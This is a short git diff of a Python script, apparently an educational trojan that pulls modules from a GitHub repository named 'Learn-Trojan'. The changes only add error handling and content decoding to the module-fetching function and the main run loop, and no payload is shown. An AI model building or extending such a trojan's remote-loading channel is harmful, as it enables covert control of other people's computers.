@@ -18,7 +18,16 @@ def github_connect():
         return sess.repositories(user, 'Learn-Trojan')
 #function to get file contents from repositories
 def get_file_contents(dirname,module_name, repo):
-    return repo.file_contents(f'{dirname}/{module_name}').content
+    try:
+        file_contents = repo.file_contents(f"{dirname}/{module_name}")
+        if file_contents is not None:
+            return file_contents.decoded.decode()
+        else:
+            print(f" File '{module_name}' not found in directory '{dirname}'.")
+            return None
+    except Exception as e:
+        print("An error occurred while retrieving file contents:", e)
+        return None
     
 #create trojan class to performs trojaning task
 #create trojan object
@@ -112,5 +121,5 @@ if __name__ == '__main__':
     trojan = Trojan('abc')
     try:
         trojan.run()
-    except:
-        print("Something is make my program error")
+    except Exception as e:
+        print("An error occur:", e)
